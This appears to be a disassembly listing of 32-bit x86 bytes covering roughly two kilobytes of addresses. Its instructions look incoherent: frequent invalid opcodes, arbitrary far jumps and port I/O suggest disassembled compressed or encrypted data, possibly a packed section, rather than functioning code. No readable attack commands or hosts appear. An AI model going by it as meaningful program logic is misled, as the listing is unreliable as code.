  4271d0:	js     0x4271ec
  4271d2:	or     cl,bl
  4271d4:	add    BYTE PTR [eax],al
  4271d6:	cmp    BYTE PTR [eax-0x33],0x24
  4271da:	lock into 
  4271dc:	leave  
  4271dd:	inc    ecx
  4271de:	xchg   ebp,eax
  4271df:	inc    ebp
  4271e0:	pop    edx
  4271e2:	retf   0xb322
  4271e5:	xor    esp,ebx
  4271e7:	fwait
  4271e8:	outs   dx,DWORD PTR ds:[esi]
  4271e9:	jge    0x427228
  4271eb:	lods   al,BYTE PTR ds:[esi]
  4271ec:	mov    ch,0x10
  4271ee:	xor    al,0xb
  4271f0:	aas    
  4271f1:	retf   0x6703
  4271f4:	add    BYTE PTR [esi+0x5cc20000],dh
  4271fa:	daa    
  4271fb:	lods   al,BYTE PTR ds:[esi]
  4271fc:	push   ecx
  4271fd:	in     eax,dx
  4271fe:	hlt    
  4271ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427200:	cdq    
  427201:	mov    BYTE PTR [esi],ah
  427203:	add    BYTE PTR [eax],al
  427205:	(bad)  
  427206:	xor    al,0x89
  427208:	data16 clc 
  42720a:	ror    dh,0x0
  42720d:	add    BYTE PTR [ebx-0x51aff94a],bl
  427213:	xchg   ecx,eax
  427214:	lods   al,BYTE PTR ds:[esi]
  427215:	(bad)  
  427216:	sub    BYTE PTR [edx+0x3c],ah
  427219:	nop
  42721a:	outs   dx,DWORD PTR ds:[esi]
  42721b:	call   DWORD PTR [eax-0x12b8c564]
  427221:	push   ebx
  427222:	dec    DWORD PTR [eax+0x230000d1]
  427228:	mov    esi,0x363e3bc
  42722d:	adc    dh,0x5a
  427230:	retf   0xc0fc
  427233:	fld    QWORD PTR [eax]
  427235:	add    BYTE PTR [ebx+0x26c806],al
  42723b:	add    BYTE PTR [esi+ebp*2-0x5b],bh
  42723f:	std    
  427240:	inc    ecx
  427241:	sar    DWORD PTR [esi+edx*4],1
  427244:	les    ecx,FWORD PTR [esi+0x0]
  427247:	add    BYTE PTR [edi],al
  427249:	jmp    0x7c73:0x7bea9110
  427250:	test   BYTE PTR [edx+0x45c2ae22],0x83
  427257:	fistp  QWORD PTR [eax-0x44cccd76]
  42725d:	das    
  42725e:	add    eax,DWORD PTR [ebp+0x1cda0137]
  427264:	fdivr  QWORD PTR [ebp-0x1d4c9375]
  42726a:	mov    esp,0x94140be2
  42726f:	inc    esi
  427270:	cmp    DWORD PTR [esi-0xef20d6f],ecx
  427276:	cmp    eax,0x4e80e37f
  42727b:	add    BYTE PTR [eax],al
  42727d:	inc    ebp
  42727e:	repz or DWORD PTR [eax-0x58],ecx
  427282:	add    BYTE PTR [eax],al
  427284:	and    al,0xdb
  427286:	xchg   esi,eax
  427287:	int3   
  427288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427289:	add    BYTE PTR [eax],al
  42728b:	arpl   WORD PTR [ecx+0x22],di
  42728e:	pop    es
  42728f:	jo     0x427254
  427291:	lock xchg ecx,eax
  427293:	loop   0x427262
  427295:	rol    DWORD PTR [ebx+0x5a],cl
  427298:	add    esi,DWORD PTR [edx+0xb9c818]
  42729e:	add    ah,al
  4272a0:	pop    edi
  4272a1:	add    BYTE PTR [eax],al
  4272a3:	aaa    
  4272a4:	jge    0x4272fe
  4272a6:	cmp    eax,0x6e137f12
  4272ab:	jno    0x427242
  4272ad:	sar    BYTE PTR [ebx],0x0
  4272b0:	add    al,dh
  4272b2:	mov    cl,0xab
  4272b4:	add    ah,bl
  4272b6:	and    eax,DWORD PTR [edx]
  4272b8:	daa    
  4272b9:	xchg   dh,dh
  4272bb:	das    
  4272bc:	nop
  4272bd:	add    BYTE PTR [ebp-0x64b253dc],0x48
  4272c4:	call   0x248872c9
  4272c9:	loop   0x42727d
  4272cb:	sbb    BYTE PTR [esi],0xe
  4272ce:	push   ebp
  4272cf:	call   0x5c5864eb
  4272d4:	imul   ecx,edx,0x67
  4272d7:	dec    edi
  4272d8:	sbb    eax,0x61d175a5
  4272dd:	repz arpl WORD PTR [ebx],bp
  4272e0:	fwait
  4272e1:	adc    al,0x2c
  4272e3:	int3   
  4272e4:	mov    eax,ds:0x54590000
  4272e9:	pop    esi
  4272ea:	dec    edi
  4272eb:	lahf   
  4272ec:	xchg   esp,eax
  4272ed:	inc    BYTE PTR [ebx-0x2a]
  4272f0:	cld    
  4272f1:	mov    al,ds:0xc24bb2e5
  4272f6:	(bad)  
  4272f7:	nop
  4272f8:	in     eax,dx
  4272f9:	(bad)  
  4272fa:	xchg   ebx,eax
  4272fb:	(bad)  
  4272fc:	jg     0x4272ce
  4272fe:	push   esi
  4272ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427300:	or     ax,0xa94
  427304:	mov    esi,0x20140a83
  427309:	shl    BYTE PTR [ecx],1
  42730b:	call   0xd5fb:0x1803922d
  427312:	rol    DWORD PTR [ebx-0x49],1
  427315:	jnp    0x427344
  427317:	loop   0x4272e3
  427319:	add    BYTE PTR [edi+0x0],ah
  42731c:	add    BYTE PTR [ebp+0xa],al
  42731f:	push   0xd8467
  427324:	add    al,al
  427326:	jne    0x427328
  427328:	add    BYTE PTR [edi+0x6d8a872b],ah
  42732e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42732f:	and    BYTE PTR [ebp+0x71b60000],0x12
  427336:	adc    BYTE PTR [edx+0x50],dh
  427339:	jp     0x4272d7
  42733b:	mov    gs,WORD PTR [eax]
  42733d:	cmp    edx,DWORD PTR [eax-0x71]
  427340:	(bad)  
  427341:	jmp    0xdba63474
  427346:	leave  
  427347:	jl     0x427362
  427349:	sbb    BYTE PTR [esi+esi*8+0x0],al
  42734d:	add    BYTE PTR [esi+0x6a4586a],dl
  427353:	pop    ebp
  427354:	xor    BYTE PTR [edx+0x649b5c9b],ch
  42735a:	mov    esi,0x6c25beec
  42735f:	pop    ss
  427360:	dec    ecx
  427361:	lea    ebp,[ecx+0x233ee581]
  427367:	xchg   ebp,eax
  427368:	add    esp,DWORD PTR [ebp+0x3e]
  42736b:	push   0xffffff86
  42736d:	pop    ecx
  42736e:	and    eax,0xfda60d8f
  427373:	jg     0x4273c0
  427375:	sbb    cl,bl
  427377:	gs dec eax
  427379:	mov    ch,0x0
  42737b:	add    BYTE PTR [edx+0x7b],cl
  42737e:	push   eax
  42737f:	lock rcr DWORD PTR [ebp+0x4566ea86],cl
  427386:	inc    edx
  427387:	jge    0x4273ab
  427389:	les    eax,FWORD PTR fs:[ecx+0x45730000]
  427390:	and    eax,0x75519460
  427395:	ins    DWORD PTR es:[edi],dx
  427396:	cdq    
  427397:	lock neg DWORD PTR [eax]
  42739a:	xor    DWORD PTR [ebp-0x31],edi
  42739d:	div    DWORD PTR [edi-0x463c9565]
  4273a3:	fsubr  DWORD PTR [esi]
  4273a5:	stc    
  4273a6:	mov    dl,0xda
  4273a8:	inc    ebx
  4273a9:	ficomp DWORD PTR [ecx+0x2e]
  4273ac:	je     0x427387
  4273ae:	sbb    BYTE PTR [edx+0x70],bh
  4273b1:	daa    
  4273b2:	or     al,0x65
  4273b4:	add    BYTE PTR [eax],al
  4273b6:	cwde   
  4273b7:	fst    QWORD PTR [ebx+edx*2]
  4273ba:	out    dx,al
  4273bb:	outs   dx,BYTE PTR ds:[esi]
  4273bc:	aas    
  4273bd:	je     0x4273f7
  4273bf:	cli    
  4273c0:	push   ebx
  4273c1:	es or  bh,ah
  4273c4:	add    BYTE PTR [eax],al
  4273c6:	(bad)  
  4273c8:	scas   eax,DWORD PTR es:[edi]
  4273c9:	push   ebx
  4273ca:	sub    DWORD PTR [ebx+0x41],0x14
  4273ce:	xor    bl,ch
  4273d0:	jp     0x4273b5
  4273d2:	(bad)  
  4273d3:	out    0xba,eax
  4273d5:	bound  esi,QWORD PTR [ebp+0x2c]
  4273d8:	fidivr DWORD PTR [eax]
  4273da:	stc    
  4273db:	inc    edi
  4273dc:	dec    edx
  4273dd:	and    eax,0x5c8f9120
  4273e2:	ds jecxz 0x4273be
  4273e5:	cld    
  4273e6:	and    ah,BYTE PTR [ecx+0x7e565081]
  4273ec:	jmp    0x42744d
  4273ee:	mov    dl,0x9f
  4273f1:	and    BYTE PTR [ebp-0x15],dh
  4273f4:	dec    eax
  4273f5:	hlt    
  4273f6:	add    BYTE PTR [eax],al
  4273f8:	clc    
  4273f9:	sbb    DWORD PTR [edi-0x75],edx
  4273fc:	cmp    esi,DWORD PTR [ebp-0x74f4409]
  427402:	cmp    al,0x5
  427404:	adc    eax,0x657f8f38
  427409:	loop   0x427425
  42740b:	mov    ah,0x49
  42740d:	mov    esp,0xf67a60b1
  427412:	in     eax,0xe0
  427414:	xor    BYTE PTR [esi+0x33],al
  427417:	mov    al,0x56
  427419:	(bad)  
  42741a:	imul   ebp,DWORD PTR [edx+0xb284d1],0x0
  427421:	jno    0x427433
  427423:	push   esi
  427424:	aas    
  427425:	scas   eax,DWORD PTR es:[edi]
  427426:	dec    esp
  427427:	test   eax,0x95210000
  42742c:	sub    edx,esp
  42742e:	je     0x4274a0
  427430:	sbb    DWORD PTR [edi-0x795e3237],edi
  427436:	mov    BYTE PTR [edx-0x45be0000],bh
  42743c:	popa   
  42743d:	sti    
  42743e:	jno    0x4273dd
  427440:	sahf   
  427441:	jae    0x427419
  427443:	inc    edi
  427444:	or     BYTE PTR [edx],al
  427446:	add    BYTE PTR [eax],al
  427448:	mov    ds:0x86e1b6b4,eax
  42744d:	mov    BYTE PTR [ebx],bl
  42744f:	add    BYTE PTR [eax],al
  427451:	xor    ah,BYTE PTR [esi+0x72198263]
  427457:	sbb    eax,0x4e897eae
  42745c:	xor    DWORD PTR [edx],eax
  42745e:	dec    eax
  42745f:	int3   
  427460:	add    BYTE PTR [eax],al
  427462:	mov    dh,0xd8
  427464:	xor    al,0xd
  427466:	jle    0x4274b3
  427468:	imul   ebp
  42746a:	sub    eax,0x33c45c
  42746f:	add    BYTE PTR [ebp+0x2d],bl
  427472:	pop    esi
  427473:	add    dh,dh
  427475:	inc    edx
  427476:	and    eax,0x31a3a970
  42747b:	enter  0x1c,0x0
  42747f:	clc    
  427480:	sbb    ah,BYTE PTR [esi]
  427482:	add    edi,DWORD PTR [ebp+eiz*2+0x3ca3951e]
  427489:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42748a:	pop    ecx
  42748b:	sub    BYTE PTR [esi+esi*2+0x6d440000],cl
  427492:	add    BYTE PTR [eax],al
  427494:	pop    es
  427495:	add    ch,dh
  427497:	popf   
  427498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427499:	xor    cl,BYTE PTR [ecx+0x7]
  42749c:	jge    0x4274b4
  42749e:	pushf  
  42749f:	bound  esp,QWORD PTR [edx+0x40f476a8]
  4274a5:	xor    eax,DWORD PTR [eax]
  4274a7:	add    BYTE PTR [edi+0x6e],al
  4274aa:	into   
  4274ab:	jns    0x4274fa
  4274ad:	les    ecx,FWORD PTR [ebp+0x0]
  4274b0:	add    BYTE PTR [ebx+eiz*2-0x47],ch
  4274b4:	retf   0x4274
  4274b7:	ret    0xf638
  4274ba:	push   cs
  4274bb:	cmp    eax,0xd8f3d8f7
  4274c0:	ins    DWORD PTR es:[edi],dx
  4274c1:	xor    bh,al
  4274c3:	mov    esp,0x2e0d8963
  4274c8:	sahf   
  4274c9:	mov    BYTE PTR [edx+0x2c550000],ah
  4274cf:	pop    ecx
  4274d0:	loopne 0x4274cd
  4274d2:	out    dx,eax
  4274d3:	test   eax,0x5840
  4274d8:	leave  
  4274d9:	stos   DWORD PTR es:[edi],eax
  4274da:	sbb    bh,bl
  4274dc:	cli    
  4274dd:	fwait
  4274de:	dec    ecx
  4274df:	outs   dx,DWORD PTR ds:[esi]
  4274e0:	pop    es
  4274e1:	fs and ebp,edi
  4274e4:	sbb    BYTE PTR [edx+0x68c1d479],bl
  4274ea:	imul   eax
  4274ec:	aad    0x64
  4274ee:	adc    al,0xb3
  4274f0:	fst    QWORD PTR fs:[esi-0x271e27a2]
  4274f7:	pop    edx
  4274f8:	cmp    al,0xd1
  4274fa:	mov    ecx,0xcb6f1d4b
  4274ff:	jmp    0x378d:0x3ade36b9
  427506:	inc    eax
  427507:	aad    0x0
  427509:	add    BYTE PTR [ebx],bh
  42750b:	ret    0x598a
  42750e:	loope  0x4274a5
  427510:	fadd   QWORD PTR [esi]
  427512:	rcr    BYTE PTR [eax+0x50],cl
  427515:	fs ret 0x3b34
  427519:	call   0x7b:0x8046e14d
  427520:	add    BYTE PTR [ebx+0x73],dh
  427523:	out    dx,eax
  427524:	sti    
  427525:	addr16 mov ds:0xdfb9,al
  427529:	xchg   ecx,eax
  42752a:	push   eax
  42752b:	pop    esi
  42752c:	xor    BYTE PTR [ecx-0xddfaee3],dh
  427532:	push   esp
  427533:	pop    es
  427534:	adc    bl,bl
  427536:	into   
  427537:	mov    dh,0xee
  427539:	rcr    BYTE PTR [esi+0x0],0x0
  42753d:	sbb    BYTE PTR [eax+ecx*1-0x7effff4e],ah
  427544:	popf   
  427545:	xchg   ebx,eax
  427546:	sub    BYTE PTR [esi],dl
  427548:	xor    edx,0x2c550679
  42754e:	push   edi
  42754f:	or     al,0xcc
  427551:	add    BYTE PTR [eax],al
  427553:	mov    BYTE PTR [ebp-0xc130000],dh
  427559:	test   DWORD PTR [esi],eax
  42755b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42755c:	in     eax,dx
  42755d:	adc    cl,BYTE PTR [edx+0x2f]
  427560:	dec    edx
  427561:	nop
  427562:	mov    ecx,0xf597327b
  427567:	push   0x1c
  427569:	ins    BYTE PTR es:[edi],dx
  42756a:	into   
  42756b:	in     eax,0xd1
  42756d:	and    eax,0xcd2b0d56
  427572:	xchg   edi,eax
  427573:	jge    0x4275e0
  427575:	sbb    cl,dh
  427577:	sar    DWORD PTR [edx+0x5b6a3aac],cl
  42757d:	shl    BYTE PTR [ebp-0x2c91dfdb],cl
  427583:	xor    dh,BYTE PTR [ebp-0x53]
  427586:	push   0xffffff82
  427588:	and    DWORD PTR [edi],esi
  42758a:	and    eax,0xb1ea665
  42758f:	shr    ah,cl
  427591:	dec    esi
  427592:	adc    bl,al
  427594:	les    eax,FWORD PTR [edi+0x0]
  427597:	add    BYTE PTR [ebp+ebx*8-0x2],dh
  42759b:	push   ss
  42759c:	jbe    0x427596
  42759e:	and    dh,BYTE PTR [esi-0x7c9945a4]
  4275a4:	jle    0x427531
  4275a6:	jg     0x4275c1
  4275a8:	jno    0x42752c
  4275aa:	and    DWORD PTR [ebx],eax
  4275ac:	sbb    cl,cl
  4275ae:	nop
  4275af:	inc    esp
  4275b0:	arpl   WORD PTR [eax],ax
  4275b2:	add    BYTE PTR [edi+0x55bb621],ch
  4275b8:	frstor [ebx+0x8]
  4275bb:	sti    
  4275bc:	add    BYTE PTR [eax],al
  4275be:	adc    eax,edx
  4275c0:	cdq    
  4275c1:	ja     0x4275af
  4275c3:	lods   al,BYTE PTR ds:[esi]
  4275c4:	fisub  DWORD PTR [ecx-0x5ab0c3d7]
  4275ca:	imul   edi,esp,0xd3b97f72
  4275d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275d1:	mov    ebp,0x6c3c9cd1
  4275d6:	imul   esi,DWORD PTR [ecx-0x241f804c],0xdd2cf946
  4275e0:	dec    ebp
  4275e1:	repz pop ebp
  4275e3:	dec    ecx
  4275e4:	mov    edi,0xcddb1093
  4275e9:	out    dx,eax
  4275ea:	mov    ebp,0xa4d75879
  4275ef:	add    eax,0xbc0c61
  4275f4:	add    BYTE PTR [ecx],dh
  4275f6:	xchg   edi,eax
  4275f7:	xchg   esi,eax
  4275f8:	dec    ebp
  4275f9:	js     0x4275cc
  4275fb:	mov    ebx,0x900a99b8
  427600:	comiss xmm1,DWORD PTR [esi+0x16]
  427604:	xor    BYTE PTR [edi-0x2b],al
  427607:	push   esi
  427608:	arpl   WORD PTR [eax],si
  42760a:	test   eax,0xb8a62e6b
  42760f:	icebp  
  427610:	xor    DWORD PTR [ecx-0x22],ecx
  427613:	loopne 0x4275f5
  427615:	loop   0x4275f7
  427617:	int3   
  427618:	sldt   WORD PTR [eax]
  42761b:	push   edi
  42761c:	pop    ss
  42761d:	and    edx,DWORD PTR [edx]
  42761f:	sub    eax,0xc8882f
  427624:	add    al,dl
  427626:	pop    edx
  427627:	dec    ebx
  427628:	stc    
  427629:	js     0x427628
  42762b:	inc    edi
  42762c:	inc    esi
  42762d:	in     eax,0x7d
  42762f:	icebp  
  427630:	push   cs
  427631:	add    dl,bh
  427633:	stos   BYTE PTR es:[edi],al
  427634:	mov    ch,0x3c
  427636:	and    eax,0xf69a0fa2
  42763b:	push   eax
  42763c:	js     0x427631
  42763e:	fs out 0x3d,eax
  427641:	addr16 iret 
  427643:	inc    ecx
  427644:	(bad)  
  427645:	pop    eax
  427646:	je     0x42769e
  427648:	xchg   esp,eax
  427649:	inc    edi
  42764a:	xor    eax,0xfc877f12
  42764f:	outs   dx,DWORD PTR ds:[esi]
  427650:	sbb    ebx,DWORD PTR [edi]
  427652:	inc    esi
  427653:	inc    edx
  427654:	push   esp
  427655:	retf   
  427656:	xchg   ecx,eax
  427657:	or     BYTE PTR [ebp+0x0],dl
  42765a:	add    BYTE PTR [edx+0xcf8c],bh
  427660:	jmp    0x42766e
  427662:	inc    DWORD PTR [eax]
  427664:	add    BYTE PTR [eax-0xa],bl
  427667:	mov    WORD PTR [ecx+0x3a190000],ds
  42766d:	fnstcw WORD PTR [eax+0x52]
  427670:	sbb    DWORD PTR [esi],edx
  427672:	call   0x196b:0x8db6605a
  427679:	inc    eax
  42767a:	test   DWORD PTR [eax],0xe22df400
  427680:	add    al,0xba
  427682:	add    BYTE PTR [eax],al
  427684:	xchg   DWORD PTR [esi],ebx
  427686:	fsub   QWORD PTR [eax-0x77]
  427689:	mov    dl,0xf9
  42768b:	xchg   ebp,ebx
  42768d:	inc    esp
  42768e:	scas   eax,DWORD PTR es:[edi]
  42768f:	add    BYTE PTR [eax],al
  427691:	imul   ebx,DWORD PTR [eax+0x17846d51],0xc6580000
  42769b:	push   0xb0866c30
  4276a0:	std    
  4276a1:	je     0x4276d8
  4276a3:	xor    BYTE PTR [ebx-0x28],al
  4276a6:	daa    
  4276a7:	xor    bl,BYTE PTR [ecx]
  4276a9:	leave  
  4276aa:	cdq    
  4276ab:	mov    ebx,0xd61d1809
  4276b0:	(bad)  
  4276b1:	or     ecx,ebx
  4276b3:	retf   0x6495
  4276b6:	std    
  4276b7:	loopne 0x4276e5
  4276b9:	shl    BYTE PTR [esi+ecx*8],1
  4276bc:	repz sub esp,DWORD PTR [ecx+0x54209a03]
  4276c3:	neg    DWORD PTR [ebp-0x2a]
  4276c6:	std    
  4276c7:	sti    
  4276c8:	aam    0xc0
  4276ca:	add    DWORD PTR [eax],0x0
  4276cd:	gs mov bh,0xc5
  4276d0:	xchg   ebx,eax
  4276d1:	and    BYTE PTR [ecx],0x0
  4276d4:	add    BYTE PTR [ebx+eax*1],cl
  4276d7:	add    BYTE PTR [eax],al
  4276d9:	inc    edx
  4276da:	sub    al,0xa0
  4276dc:	or     al,BYTE PTR [edx+edi*2]
  4276df:	add    BYTE PTR [eax],al
  4276e1:	(bad)  
  4276e2:	mov    ebx,0xe93a04b
  4276e7:	clc    
  4276e8:	gs pushw ss
  4276eb:	dec    edi
  4276ec:	leave  
  4276ed:	push   0xaceba529
  4276f2:	stos   DWORD PTR es:[edi],eax
  4276f3:	in     al,dx
  4276f4:	jecxz  0x427694
  4276f6:	mov    esp,0xbec04f
  4276fb:	add    BYTE PTR [ecx+0x80c5e],ch
  427701:	add    BYTE PTR [ebp-0xb],ch
  427704:	mov    dh,0x33
  427706:	mov    esp,0xc1118511
  42770b:	(bad)  
  42770c:	sbb    BYTE PTR [edi+0x684c9e],dl
  427712:	add    BYTE PTR [ebx+0x12],al
  427715:	cmp    eax,DWORD PTR [edx+0x12]
  427718:	out    0x5f,eax
  42771a:	test   DWORD PTR [ecx-0x52eecf24],eax
  427720:	push   ebp
  427721:	mov    DWORD PTR [esi],esi
  427723:	adc    DWORD PTR [edx],ebp
  427725:	and    al,ch
  427727:	fwait
  427728:	mov    al,ds:0x7e32215b
  42772d:	jmp    0x42772e
  42772f:	pop    ebx
  427730:	push   edx
  427731:	and    cl,BYTE PTR [ebp-0x69282028]
  427737:	cmp    al,0x93
  427739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42773a:	jg     0x4277ba
  42773c:	in     al,dx
  42773d:	test   DWORD PTR [edi],esi
  42773f:	retf   0x99c8
  427742:	add    BYTE PTR [eax],al
  427744:	stc    
  427745:	scas   al,BYTE PTR es:[edi]
  427746:	add    BYTE PTR [ebp+0x0],ch
  427749:	add    BYTE PTR [ecx+0x2d],dh
  42774c:	mov    esi,0xf3b6b59d
  427751:	int    0x7b
  427753:	cmp    ch,BYTE PTR [eax]
  427755:	bswap  ecx
  427757:	push   DWORD PTR [ebp+0x51]
  42775a:	shl    BYTE PTR [esi+0x504c0000],0x0
  427761:	add    BYTE PTR ds:0x2138c6a4,al
  427767:	inc    eax
  427768:	fild   DWORD PTR [eax]
  42776a:	add    BYTE PTR [edx],bl
  42776c:	dec    edi
  42776d:	sub    edx,DWORD PTR [esi]
  42776f:	xor    DWORD PTR [ecx+0x5c],edx
  427772:	dec    esp
  427773:	ins    BYTE PTR es:[edi],dx
  427774:	add    BYTE PTR [eax],al
  427776:	gs inc ebx
  427778:	add    dl,dl
  42777a:	xor    cl,cl
  42777c:	clc    
  42777d:	mov    ebp,0xf4dc817a
  427782:	or     eax,0x90a7566b
  427787:	dec    ecx
  427788:	retf   0x7692
  42778b:	jge    0x427733
  42778d:	adc    ch,ah
  42778f:	mov    esi,0x6b4c
  427794:	pop    ds
  427795:	xchg   edi,eax
  427796:	pop    ebp
  427797:	cwde   
  427798:	adc    esp,DWORD PTR [edi+0x36]
  42779b:	mov    al,cs:0xeac0aaf4
  4277a1:	add    BYTE PTR [eax],al
  4277a3:	jb     0x427734
  4277a5:	mov    ds:0x639d9de9,al
  4277aa:	out    dx,eax
  4277ab:	inc    edx
  4277ac:	sbb    al,ch
  4277ae:	(bad)  
  4277af:	pop    edx
  4277b0:	xor    eax,0x5d049d
  4277b5:	add    BYTE PTR [edx-0x67],dl
  4277b8:	add    esi,DWORD PTR [ecx+0x768194ed]
  4277be:	xchg   edi,eax
  4277bf:	xchg   BYTE PTR [eax+0xf],al
  4277c2:	add    BYTE PTR [eax],al
  4277c4:	and    eax,0x1c4610d3
  4277c9:	and    edx,DWORD PTR [edx]
  4277cb:	mov    ss,WORD PTR [edx+ecx*4-0x711a2f2]
  4277d2:	pop    esp
  4277d3:	std    
  4277d4:	push   esp
  4277d5:	es sbb eax,0x4f8c
  4277db:	fstp   DWORD PTR [esi+0x7f]
  4277de:	inc    edx
  4277df:	addr16 inc edx
  4277e1:	sbb    eax,0x574d57b
  4277e6:	xchg   edi,ecx
  4277e8:	ins    DWORD PTR es:[edi],dx
  4277e9:	and    DWORD PTR [eax],ebx
  4277eb:	leave  
  4277ec:	daa    
  4277ed:	mov    edx,0xbf4b4bd4
  4277f2:	jmp    0x429e7b
  4277f7:	je     0x42783c
  4277f9:	call   0xea53:0xb0a5356f
  427800:	rcl    DWORD PTR [edx-0x16],1
  427803:	mov    ds:0x6448cbe0,eax
  427808:	add    BYTE PTR [eax],al
  42780a:	lods   eax,DWORD PTR ds:[esi]
  42780b:	mov    dl,0x89
  42780d:	fadd   st(0),st
  42780f:	mov    esp,0x96520000
  427814:	(bad)  
  427815:	out    0x55,al
  427817:	push   eax
  427818:	dec    ebx
  427819:	iret   
  42781a:	retf   0x81ca
  42781d:	iret   
  42781e:	sti    
  42781f:	loope  0x42784b
  427821:	dec    edi
  427822:	js     0x4277fa
  427824:	jge    0x42784d
  427826:	hlt    
  427827:	or     DWORD PTR [ebp+0x3d],esi
  42782a:	pop    edi
  42782b:	in     al,dx
  42782c:	push   eax
  42782d:	iret   
  42782e:	inc    eax
  42782f:	pop    esp
  427830:	add    BYTE PTR [eax],al
  427832:	jp     0x427822
  427834:	mov    ch,0x74
  427836:	adc    DWORD PTR ds:0xe80821de,eax
  42783c:	add    BYTE PTR [eax],al
  42783e:	leave  
  42783f:	xor    BYTE PTR [eax],ch
  427841:	jae    0x4277f2
  427843:	lock sbb ebx,ecx
  427846:	xchg   ebp,eax
  427847:	jno    0x42789e
  427849:	cmp    DWORD PTR [eax+eiz*1+0x3d],ebp
  42784d:	sbb    al,0x5e
  42784f:	pop    ebx
  427850:	call   DWORD PTR [edx]
  427852:	push   ebp
  427853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427854:	pushf  
  427855:	lds    ecx,FWORD PTR [edx+0x4259f7c6]
  42785b:	fistp  DWORD PTR [eax+esi*4]
  42785e:	lods   al,BYTE PTR ds:[esi]
  42785f:	xchg   ecx,eax
  427860:	sub    ebp,DWORD PTR [edi]
  427862:	jmp    0x23275ebe
  427867:	clc    
  427868:	mov    bl,0xbe
  42786a:	adc    eax,0xcf8a9bd1
  42786f:	push   esp
  427870:	rol    BYTE PTR [eax+eax*1],0x0
  427874:	enter  0xc9,0x0
  427878:	cs mov dh,0x5d
  42787b:	dec    edx
  42787c:	leave  
  42787d:	jmp    0xa4b6a905
  427882:	(bad)  
  427883:	(bad)  
  427885:	aad    0x61
  427887:	sub    DWORD PTR ds:[edi-0x71],edi
  42788b:	stc    
  42788c:	popa   
  42788d:	repnz std 
  42788f:	neg    BYTE PTR [ecx+0x7dc4]
  427895:	lds    edx,FWORD PTR [ecx+0x65]
  427898:	scas   eax,DWORD PTR es:[edi]
  427899:	pop    es
  42789a:	pop    esp
  42789b:	punpcklbw xmm4,XMMWORD PTR [ebx+0x61b18617]
  4278a3:	mov    dh,0x7e
  4278a5:	mov    edx,edi
  4278a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278a8:	in     al,dx
  4278a9:	stos   BYTE PTR es:[edi],al
  4278aa:	adc    eax,DWORD PTR [ebx+ecx*4+0x0]
  4278ae:	add    al,ch
  4278b0:	shr    DWORD PTR [ebp+0x5607baec],0x90
  4278b7:	push   esi
  4278b8:	or     al,0x11
  4278ba:	add    BYTE PTR [eax],al
  4278bc:	sub    ebp,DWORD PTR [ebx+0x7b]
  4278bf:	ret    0x9240
  4278c2:	add    BYTE PTR [eax],al
  4278c4:	sub    al,0xd8
  4278c6:	adc    DWORD PTR [esp+ebp*8+0x73b31f5b],esp
  4278cd:	clc    
  4278ce:	fs (bad) 
  4278d0:	bound  esi,QWORD PTR ds:0x4826c32e
  4278d6:	mov    DWORD PTR [eax],eax
  4278d8:	add    BYTE PTR [eax+0x26],ah
  4278db:	push   edi
  4278dc:	fsub   QWORD PTR [edi+ebx*1+0x73ea7521]
  4278e3:	arpl   WORD PTR [edi+0x73],ax
  4278e6:	push   ss
  4278e7:	arpl   WORD PTR [esi+0x52],sp
  4278ea:	fdivp  st(0),st
  4278ec:	(bad)  
  4278ed:	jae    0x42791f
  4278ef:	ret    0x1fcf
  4278f2:	dec    ebp
  4278f3:	xchg   esp,eax
  4278f4:	loope  0x427940
  4278f6:	retf   0x7f3d
  4278f9:	jl     0x4278da
  4278fb:	fnstsw WORD PTR [ebx-0x3f]
  4278fe:	mov    WORD PTR [eax+0x458c0000],ds
  427904:	add    BYTE PTR [eax],al
  427906:	in     al,dx
  427907:	xchg   ecx,eax
  427908:	rcr    dh,0x0
  42790b:	add    BYTE PTR [eax+0x8a4c],ah
  427911:	scas   eax,DWORD PTR es:[edi]
  427912:	xor    BYTE PTR [esi],cl
  427914:	scas   al,BYTE PTR es:[edi]
  427915:	xlat   BYTE PTR ds:[ebx]
  427916:	xchg   edx,eax
  427917:	cmp    ah,BYTE PTR ds:0x9c256363
  42791d:	or     eax,0x8efe3a0b
  427922:	push   esi
  427923:	xchg   esp,eax
  427924:	fnstcw WORD PTR [eax+0x2e6e15c1]
  42792a:	mov    bh,al
  42792c:	add    BYTE PTR [eax],al
  42792e:	or     eax,DWORD PTR ss:[ebx]
  427931:	ss in  eax,0x7c
  427934:	sbb    bl,al
  427936:	xchg   ebx,esi
  427938:	das    
  427939:	jmpw   0x1255
  42793d:	nop
  42793e:	(bad)  
  42793f:	sbb    bl,bh
  427941:	sub    DWORD PTR [ebx-0x4c775ed2],esp
  427947:	add    BYTE PTR [eax],al
  427949:	mov    ds:0xec2b68ee,al
  42794e:	imul   esp
  427950:	xchg   esi,eax
  427951:	pop    ss
  427952:	mov    ds:0x687610ee,al
  427957:	lods   eax,DWORD PTR ds:[esi]
  427958:	inc    edx
  427959:	xchg   ebx,eax
  42795a:	es dec edi
  42795c:	jne    0x427997
  42795e:	into   
  42795f:	mov    eax,ds:0xaebdfded
  427964:	sbb    edx,esp
  427966:	jmp    DWORD PTR [edx-0x20]
  427969:	push   ds
  42796a:	mov    ah,0x9f
  42796c:	or     DWORD PTR [edi+0x116ad62f],edx
  427972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427973:	xor    eax,0x7344a60d
  427978:	add    BYTE PTR [eax],al
  42797a:	in     al,0xf0
  42797c:	mov    dl,0x85
  42797e:	lahf   
  42797f:	mov    eax,0x520c
  427984:	cmc    
  427985:	inc    ecx
  427986:	xor    al,0xd7
  427988:	out    dx,eax
  427989:	(bad)  [ebx]
  42798b:	gs sbb eax,0x9aad9e37
  427991:	fs ss into 
  427994:	jl     0x42792b
  427996:	pop    ds
  427997:	xchg   DWORD PTR [ebp-0x391df268],edx
  42799d:	mov    ebp,0xdae41e05
  4279a2:	inc    ebx
  4279a3:	jbe    0x42794d
  4279a5:	int3   
